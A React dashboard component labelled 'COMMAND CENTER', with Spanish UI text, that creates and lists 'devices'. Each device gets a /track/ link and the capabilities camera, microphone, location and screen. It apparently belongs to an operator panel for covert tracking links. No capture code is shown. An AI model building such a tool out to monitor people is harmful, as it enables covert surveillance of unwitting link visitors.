import { useState, useEffect } from 'react';
import { v4 as uuid } from 'uuid';
import CreateDeviceModal from './CreateDeviceModal';
import DeviceCard from './DeviceCard';

export default function Dashboard({ onLogout }) {
  const [devices, setDevices] = useState([]);

  useEffect(() => {
    const stored = JSON.parse(localStorage.getItem('devices') || '[]');
    setDevices(stored);
  }, []);

  const createDevice = (name, type) => {
    const newDevice = {
      id: uuid(),
      name,
      type,
      url: `${window.location.origin}/track/${uuid()}`,
      status: 'offline',
      created: new Date().toISOString(),
      lastSeen: null,
      capabilities: ['camera', 'microphone', 'location', 'screen']
    };
    const updated = [...devices, newDevice];
    setDevices(updated);
    localStorage.setItem('devices', JSON.stringify(updated));
  };

  const deleteDevice = (id) => {
    const updated = devices.filter((d) => d.id !== id);
    setDevices(updated);
    localStorage.setItem('devices', JSON.stringify(updated));
  };

  return (
    <div className="min-h-screen bg-black text-green-400 p-6">
      <header className="flex justify-between items-center mb-6">
        <h1 className="text-3xl font-bold">COMMAND CENTER</h1>
        <button
          onClick={onLogout}
          className="bg-red-700 hover:bg-red-600 text-white px-4 py-2 rounded"
        >
          Salir
        </button>
      </header>

      <CreateDeviceModal onCreate={createDevice} />

      <section>
        <h2 className="text-xl mb-4">Dispositivos ({devices.length})</h2>
        {devices.length === 0 && <p>No hay dispositivos</p>}
        <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-3">
          {devices.map((d) => (
            <DeviceCard key={d.id} device={d} onDelete={deleteDevice} />
          ))}
        </div>
      </section>
    </div>
  );
}
